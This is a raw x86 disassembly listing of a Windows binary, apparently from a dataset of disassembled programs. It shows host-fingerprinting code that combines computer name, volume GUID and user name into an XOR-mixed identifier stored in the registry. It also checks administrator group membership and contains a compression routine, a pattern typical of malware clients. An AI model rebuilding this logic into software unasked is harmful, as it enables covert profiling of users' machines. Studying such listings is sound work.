push ebp
mov ebp esp
sub esp 0x18
push esi
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call [ IIDFromString@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
mov esi eax
add esi esi
call sub_4046cc
push esi
lea eax [ ebp + 0x8 ]
push eax
call sub_401806
xor eax [ ebp + 0x8 ]
xor edx edx
xor edx [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
jmp r-xdata
pop esi
leave
retn
sub_4054a4
push ebp
mov ebp esp
sub esp 0x678
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x57bc ]
push edi
mov edi 0x80
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
xor al al
push eax
call sub_405cd1
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ rw-data ]
or eax [ rw-data ]
jne r-xdata
test al al
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov ecx 0x100
lea eax [ ebp - 0x264 ]
push [ ebp - 0x20 ]
call sub_405cf1
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x264 ]
push eax
push 0x6
call [ GetComputerObjectNameW@IAT ]
test al al
jne r-xdata
lea eax [ ebp - 0x264 ]
mov ebx 0x104
push ebx
lea eax [ ebp - 0x674 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
xor eax eax
mov [ ebp - 0x66e ] ax
push ebx
lea eax [ ebp - 0x46c ]
push eax
lea eax [ ebp - 0x674 ]
push eax
call [ GetVolumeNameForVolumeMountPointW@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov eax r--data
mov [ ebp - 0x24 ] edi
cmp ecx eax
je r-xdata
push 0x4c
lea eax [ ebp - 0x458 ]
push eax
lea eax [ ebp - 0x46c ]
push eax
mov [ ebp - 0x1c ] 0x26
call sub_412d60
mov ecx [ ebp - 0x1c ]
add esp 0xc
xor eax eax
mov [ ebp + ecx * 2 - 0x46c ] ax
lea eax [ ebp - 0x46c ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
call [ UuidCreate@IAT ]
push 0x8
pop ecx
push 0xffffffff
xor eax eax
lea edi [ ebp - 0x164 ]
push esi
lea ebx [ ebp - 0x164 ]
[ edi ]
call sub_40394f
push 0x8
movzx eax ax
xor [ ebp - 0x14 ] eax
pop ecx
push 0xffff
xor eax eax
lea edi [ ebp - 0x124 ]
push esi
lea ebx [ ebp - 0x124 ]
[ edi ]
call sub_40394f
mov ecx [ ebp - 0x14 ]
or ecx eax
xor [ ebp - 0x10 ] cx
push 0x8
pop ecx
mov eax 0x1234
xor [ ebp - 0xe ] ax
mov esi 0xff
push esi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0xa4 ]
lea ebx [ ebp - 0xa4 ]
[ edi ]
call sub_40394f
xor [ ebp - 0xc ] al
push 0x8
pop ecx
push esi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x44 ]
lea ebx [ ebp - 0x44 ]
[ edi ]
call sub_40394f
push 0x8
pop ecx
add al 0x64
xor [ ebp - 0xb ] al
push esi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0xe4 ]
lea ebx [ ebp - 0xe4 ]
[ edi ]
call sub_40394f
push 0x8
pop ecx
sub al 0x11
xor [ ebp - 0xa ] al
push esi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x144 ]
lea ebx [ ebp - 0x144 ]
[ edi ]
call sub_40394f
mov cl 0x22
imul cl
xor [ ebp - 0x9 ] al
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0x64 ]
push esi
push [ ebp + 0x8 ]
[ edi ]
lea ebx [ ebp - 0x64 ]
call sub_40394f
push 0x8
pop ecx
add al 0x1d
xor [ ebp - 0x8 ] al
push esi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x84 ]
lea ebx [ ebp - 0x84 ]
[ edi ]
call sub_40394f
push 0x8
pop ecx
sub al 0x61
xor [ ebp - 0x7 ] al
push esi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0xc4 ]
lea ebx [ ebp - 0xc4 ]
[ edi ]
call sub_40394f
mov cl 0x15
imul cl
xor [ ebp - 0x6 ] al
push 0x8
pop ecx
push esi
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x104 ]
lea ebx [ ebp - 0x104 ]
[ edi ]
call sub_40394f
add al 0xb
xor [ ebp - 0x5 ] al
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call [ StringFromIID@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x264 ]
push ecx
push r--data
push eax
push 0x80000001
lea edi [ ebp - 0x24 ]
call sub_4068cf
test al al
jne r-xdata
push eax
call sub_40545d
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] edx
push [ ebp - 0x18 ]
lea eax [ ebp - 0x264 ]
push eax
call [ lstrcpyW@IAT ]
push [ ebp - 0x18 ]
call [ lstrlenW@IAT ]
xor edx edx
mov ecx r--data
add eax eax
cmp edx ecx
je r-xdata
push [ ebp - 0x18 ]
call [ CoTaskMemFree@IAT ]
push eax
push [ ebp - 0x18 ]
push 0x3
push r--data
push ecx
push 0x80000001
call sub_40697b
sub_4057a1
push ebp
mov ebp esp
sub esp 0x2c
mov edx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp [ edx + 0x5960 ] 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] 0x500
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x5960 ]
pop ebx
leave
retn 0x4
push esi
mov esi rw-data
mov ecx 0x200
mov eax esi
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push esi
mov [ edx + 0x5960 ] ebx
mov [ ebp - 0x8 ] 0x100
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
push edi
mov esi [ AllocateAndInitializeSid@IAT ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x223
push 0x20
push 0x2
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x222
push 0x20
push 0x2
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x18 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x12
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x1c ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x13
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x14
pop edi
push edi
push 0x1
lea eax [ ebp - 0x2c ]
push eax
call esi
mov eax [ ebp + 0x8 ]
mov esi [ CheckTokenMembership@IAT ]
mov [ eax + 0x5960 ] edi
mov edi [ FreeSid@IAT ]
cmp [ ebp - 0xc ] ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push 0x5
push 0xffffffff
push ebx
call [ WTSQuerySessionInformationW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0xc ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x24 ]
push esi
call sub_413290
add esp 0xc
push [ ebp - 0x24 ]
call [ WTSFreeMemory@IAT ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x10 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0xc ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x14 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x5960 ] 0x28
cmp [ ebp - 0x1c ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x18 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x5960 ] 0x1e
cmp [ ebp - 0x20 ] ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x1c ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x18 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x5960 ] 0xa
pop edi
pop esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x20 ]
push ebx
call esi
test eax eax
je r-xdata
push [ ebp - 0x1c ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x5960 ] 0x32
push [ ebp - 0x20 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x5960 ] 0x34
mov eax [ ebp + 0x8 ]
mov [ eax + 0x5960 ] 0x36
sub_4059ed
push ebp
mov ebp esp
sub esp 0x814
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
xor eax eax
push 0x7fe
push eax
mov [ ebp - 0x814 ] ax
lea eax [ ebp - 0x812 ]
push eax
mov esi ebx
mov [ ebp - 0xc ] 0x80
call sub_4130d0
mov eax [ ebp + 0x10 ]
add eax ebx
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp ebx eax
jb r-xdata
shl [ ebp - 0xc ] 0x1
cmp [ ebp - 0xc ] 0x100
jne r-xdata
sub edi [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edi
mov al 0x1
add eax 0xffffffbe
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov ecx [ ebp + 0xc ]
lea edx [ edx + ecx - 0x11 ]
cmp edi edx
jae r-xdata
movzx eax [ esi ]
movzx ecx [ esi + 0x1 ]
shl eax 0x8
add eax ecx
movzx ecx [ esi + 0x2 ]
shl eax 0x8
add eax ecx
mov ecx eax
shr ecx 0x9
add eax ecx
mov ecx eax
shr ecx 0x5
add ecx eax
and ecx 0x3ff
lea eax [ ebp + ecx * 2 - 0x814 ]
movzx ebx [ eax ]
mov ecx esi
sub ecx ebx
mov [ eax ] si
and ecx 0x3ff
mov eax esi
sub eax ecx
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov esi edi
mov eax ebx
test edi edi
je r-xdata
mov [ ebp - 0x10 ] edi
mov [ edi ] 0x0
mov [ ebp - 0xc ] 0x1
inc edi
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
cmp eax esi
je r-xdata
mov eax [ ebp - 0x14 ]
cmp esi eax
jb r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] edi
xor al al
jmp r-xdata
sub ecx ebx
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov bl [ esi ]
cmp bl [ eax ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
dec esi
jne r-xdata
mov bl [ esi + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
mov bl [ esi + 0x2 ]
cmp bl [ eax + 0x2 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov bl [ ebp - 0xc ]
or [ edx ] bl
mov [ ebp - 0x8 ] 0x3
lea edx [ esi + 0x3 ]
sub eax esi
mov al [ ebp - 0x8 ]
sub al 0x3
shl al 0x2
mov edx ecx
shr edx 0x8
or al dl
mov [ edi ] al
mov [ edi + 0x1 ] cl
add edi 0x2
add esi [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x8 ]
inc edx
cmp [ ebp - 0x8 ] 0x42
jb r-xdata
mov bl [ edx ]
cmp bl [ eax + edx ]
jne r-xdata
sub_405b60
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0xc ]
and [ ebp - 0xc ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ecx ]
add eax edx
add esi ebx
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x80
cmp edx eax
jae r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
cmp ebx esi
jae r-xdata
cmp edx [ ebp - 0x10 ]
jae r-xdata
shl [ ebp - 0x8 ] 0x1
cmp [ ebp - 0x8 ] 0x100
jne r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
mov al [ ebp - 0x8 ]
test [ ebp - 0x1 ] al
je r-xdata
mov al [ edx ]
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x1 ] al
inc edx
pop edi
pop esi
pop ebx
leave
retn
mov al [ edx ]
mov [ ebx ] al
inc ebx
inc edx
inc [ ebp - 0xc ]
movzx eax [ edx ]
movzx ecx [ edx + 0x1 ]
mov edi eax
shl eax 0x8
or ecx eax
and ecx 0x3ff
shr edi 0x2
mov eax ebx
sub eax ecx
add edi 0x3
add edx 0x2
cmp eax [ ebp + 0x8 ]
jae r-xdata
dec edi
jns r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx esi
jae r-xdata
jmp r-xdata
cmp edx [ ebp - 0x10 ]
jb r-xdata
mov cl [ eax ]
mov [ ebx ] cl
inc ebx
inc eax
inc [ ebp - 0xc ]
sub_405c10
push esi
mov esi [ HeapCreate@IAT ]
push edi
push 0x0
mov edi 0x1000
push edi
push 0x0
call esi
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov al 0x1
push eax
push edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
retn
sub_405c44
push ebx
xor ebx ebx
cmp [ esp + 0x8 ] ebx
je r-xdata
pop ebx
retn 0x4
cmp [ rw-data ] ebx
jne r-xdata
push ebx
call [ SetLastError@IAT ]
push [ esp + 0x8 ]
push ebx
push [ rw-data ]
call [ HeapFree@IAT ]
push ebx
push [ rw-data ]
call [ HeapCompact@IAT ]
call sub_405c10
cmp al bl
je r-xdata
sub_405c87
push esi
xor esi esi
cmp eax esi
je r-xdata
xor al al
cmp [ esp + 0x8 ] esi
jle r-xdata
sub ecx eax
inc eax
inc esi
cmp esi [ esp + 0x8 ]
jl r-xdata
mov dl [ ecx + eax ]
cmp dl [ eax ]
jne r-xdata
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_405d11
push ebx
xor ebx ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] 0x2000
call sub_4046cc
cmp [ rw-data ] ebx
jne r-xdata
push ebx
call [ SetLastError@IAT ]
push 0x2004
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
jne r-xdata
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov eax esi
pop ebx
retn
push ebx
call [ ExitProcess@IAT ]
xor eax eax
sub_405d65
mov eax [ esp + 0x4 ]
add eax 0x2000
cdq
and edx 0xf
add eax edx
sar eax 0x4
push ebx
xor ebx ebx
inc eax
shl eax 0x4
push edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] eax
mov edi eax
call sub_4046cc
cmp edi 0x6400000
ja r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
mov [ esi + 0x4 ] ebx
cmp eax ebx
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jne r-xdata
xor edi edi
inc edi
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
jmp r-xdata
push ebx
call [ SetLastError@IAT ]
push edi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
je r-xdata
pop edi
mov eax esi
pop ebx
retn 0x8
mov [ esi ] eax
cmp [ esp + 0x10 ] bl
je r-xdata
push ebx
call [ ExitProcess@IAT ]
sub_405df1
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x8 ]
push ebx
test eax eax
jle r-xdata
mov [ esi + 0x8 ] 0x2000
mov [ esi + 0x8 ] eax
jmp r-xdata
xor eax eax
test ebx ebx
jne r-xdata
mov ebx [ esi + 0x8 ]
call sub_4046cc
cmp ebx 0x6400000
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop ebx
retn
test eax eax
je r-xdata
add ebx 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc ebx
cmp [ edi + 0x8 ] 0x0
jle r-xdata
push 0x0
call [ SetLastError@IAT ]
push ebx
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
je r-xdata
push [ esi + 0x8 ]
push ecx
push eax
call sub_412d60
add esp 0xc
mov [ esi ] eax
mov ecx [ edi ]
test ecx ecx
je r-xdata
push eax
call [ ExitProcess@IAT ]
sub_405e82
push ebx
cmp esi edi
je r-xdata
mov eax esi
pop ebx
retn
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x8 ]
test eax eax
jle r-xdata
mov [ esi + 0x8 ] 0x2000
mov [ esi + 0x8 ] eax
jmp r-xdata
mov ebx [ esi + 0x8 ]
call sub_4046cc
cmp ebx 0x6400000
ja r-xdata
call sub_4046cc
push [ esi ]
call sub_405c44
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ebx ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc ebx
cmp [ edi + 0x8 ] 0x0
jle r-xdata
push 0x0
call [ SetLastError@IAT ]
push ebx
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
je r-xdata
push [ esi + 0x8 ]
push ecx
push eax
call sub_412d60
add esp 0xc
mov [ esi ] eax
mov ecx [ edi ]
test ecx ecx
je r-xdata
push eax
call [ ExitProcess@IAT ]
sub_405f3e
push ebx
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
mov [ esi + 0x8 ] 0x80
call sub_4046cc
cmp [ rw-data ] ebx
jne r-xdata
call sub_4046cc
push [ esi ]
call sub_405c44
push ebx
call [ SetLastError@IAT ]
push 0x84
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
jne r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi ] eax
pop ebx
retn
push ebx
call [ ExitProcess@IAT ]
xor eax eax
sub_405f9d
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x4 ]
add eax [ ebp + 0x8 ]
push ebx
push edi
cmp [ esi + 0x8 ] eax
jg r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
add eax 0x2000
cdq
and edx 0xf
add eax edx
mov edi eax
sar edi 0x4
inc edi
shl edi 0x4
xor ebx ebx
mov [ ebp - 0x4 ] edi
cmp [ esi ] ebx
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
add [ esi + 0x4 ] eax
call sub_4046cc
cmp edi ebx
jl r-xdata
call sub_4046cc
cmp edi ebx
jl r-xdata
test ebx ebx
je r-xdata
cmp edi 0x6400000
jg r-xdata
xor eax eax
cmp edi 0x6400000
jg r-xdata
xor al al
jmp r-xdata
push [ esi + 0x4 ]
push [ esi ]
push ebx
call sub_412d60
add esp 0xc
call sub_4046cc
push [ esi ]
call sub_405c44
mov [ esi ] ebx
cmp edi ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x8 ] ebx
cmp edi ebx
jne r-xdata
pop edi
pop ebx
leave
retn 0x8
add [ ebp - 0x4 ] 0x4
cmp [ rw-data ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add [ ebp - 0x4 ] 0x4
cmp [ rw-data ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
push ebx
call [ SetLastError@IAT ]
push [ ebp - 0x4 ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
call sub_405c10
test al al
je r-xdata
push ebx
call [ SetLastError@IAT ]
push [ ebp - 0x4 ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
test al al
je r-xdata
push ebx
call [ ExitProcess@IAT ]
mov ebx eax
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
cmp eax ebx
jne r-xdata
sub_4060be
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi eax
cmp [ esi ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x8 ] ebx
je r-xdata
cmp edi ebx
jl r-xdata
cmp [ ebp + 0xc ] bl
je r-xdata
cmp edi ebx
jle r-xdata
add edi 0x2
push ebx
push edi
call sub_405f9d
cmp al bl
je r-xdata
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ esi + 0x4 ]
add eax [ esi ]
push edi
push [ ebp + 0x8 ]
push eax
call sub_413290
add [ esi + 0x4 ] edi
mov eax [ esi + 0x4 ]
add esp 0xc
cmp [ ebp + 0xc ] bl
je r-xdata
sub edi 0x2
mov al 0x1
jmp r-xdata
mov ecx [ esi ]
mov [ eax + ecx ] bl
inc [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov [ eax + ecx ] bl
inc [ esi + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406135
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp + 0xc ]
call [ lstrlenW@IAT ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
add eax eax
call sub_4060be
xor al al
jmp r-xdata
pop ecx
pop ebp
retn 0xc
sub_406173
push ecx
push esi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
xor al al
cmp [ esp + 0xc ] 0x0
je r-xdata
test edi edi
js r-xdata
jle r-xdata
push 0x0
push edi
call sub_405f9d
test al al
je r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push eax
add eax edi
push eax
call sub_412d60
add [ esi + 0x4 ] edi
add esp 0xc
push edi
push [ esp + 0x10 ]
push [ esi ]
call sub_413290
add esp 0xc
mov al 0x1
jmp r-xdata
pop esi
pop ecx
retn 0x4
sub_4061d9
push ecx
push ebx
push ebp
push esi
push edi
call sub_4046cc
mov ebp rw-data
push ebp
call sub_405cd1
test al al
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov esi [ rw-data ]
mov ebx [ rw-data ]
shr esi 0x2
xor edi edi
test esi esi
jle r-xdata
call sub_40653c
call sub_4046cc
push ebp
call sub_405cf1
mov eax [ ebx + edi * 4 ]
test [ eax + 0x34 ] 0x1
je r-xdata
inc edi
cmp edi esi
jl r-xdata
call sub_4046cc
push [ ebx + edi * 4 ]
call sub_405c44
and [ ebx + edi * 4 ] 0x0
sub_40623c
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor ebx ebx
push edi
mov esi eax
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor al al
cmp esi ebx
jle r-xdata
lea edi [ esi + esi ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
call sub_4046cc
cmp edi ebx
jl r-xdata
mov [ ebp - 0x8 ] ebx
cmp edi 0x6400000
jg r-xdata
call sub_4046cc
cmp edi 0x1
jbe r-xdata
cmp edi ebx
jne r-xdata
lea edi [ esi + 0x3b ]
call sub_4046cc
cmp edi 0x6400000
ja r-xdata
cmp esi 0x1
jbe r-xdata
add [ ebp - 0x8 ] 0x4
cmp [ rw-data ] ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
xor eax eax
cmp edi ebx
jne r-xdata
mov edi [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push esi
push edi
push [ ebp + 0x8 ]
call sub_4059ed
add esp 0x10
cmp al bl
je r-xdata
push ebx
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
je r-xdata
call sub_4046cc
push eax
call sub_4054a4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
call sub_4046cc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x10 ] 0x80051a85
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ ebp + 0x14 ]
mov [ eax + 0x20 ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x35 ] cl
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x2c ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x1c ]
mov [ eax + 0x24 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ ebp - 0x10 ]
mov [ eax + 0x14 ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] cl
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x20 ]
mov [ eax + 0x30 ] ecx
mov eax [ ebp - 0x4 ]
push esi
push [ ebp + 0x8 ]
add eax 0x36
push eax
call sub_412d60
add esp 0xc
call sub_4046cc
push [ ebp - 0x8 ]
call sub_405c44
mov edi [ ebp - 0x4 ]
add edi 0x4
call sub_4046cc
cmp edi ebx
je r-xdata
call sub_4046cc
push [ ebp - 0x8 ]
call sub_405c44
add edi 0x4
cmp [ rw-data ] ebx
jne r-xdata
xor edi edi
inc edi
mov esi [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x10 ] 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebx
call [ ExitProcess@IAT ]
xor eax eax
lea eax [ esi + 0x32 ]
push eax
push edi
call sub_401806
jmp r-xdata
push ebx
call [ SetLastError@IAT ]
push edi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push eax
push 0x4
pop eax
mov ecx rw-data
call sub_4060be
call sub_40653c
call sub_4046cc
push esi
call sub_405cf1
mov al 0x1
jmp r-xdata
push 0x67
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ eax + esi + 0x36 ] ecx
mov esi rw-data
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
call sub_4046cc
push esi
call sub_405cd1
cmp al bl
jne r-xdata
sub_40647f
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov ebx eax
mov esi ecx
call sub_403925
mov [ esp + 0xc ] eax
test esi esi
je r-xdata
xor al al
lea eax [ ebx - 0x1 ]
cmp eax 0x63fffff
ja r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ rw-data ]
jmp r-xdata
push [ esp + 0xc ]
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
cmp ebx eax
ja r-xdata
call sub_40623c
test al al
je r-xdata
mov eax ebx
call sub_40623c
test al al
setne al
jmp r-xdata
mov eax [ rw-data ]
add esi eax
sub ebx eax
add edi eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_4064f1
push esi
push edi
xor edi edi
call sub_4046cc
mov esi rw-data
push esi
call sub_405cd1
test al al
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
mov eax [ rw-data ]
shr eax 0x2
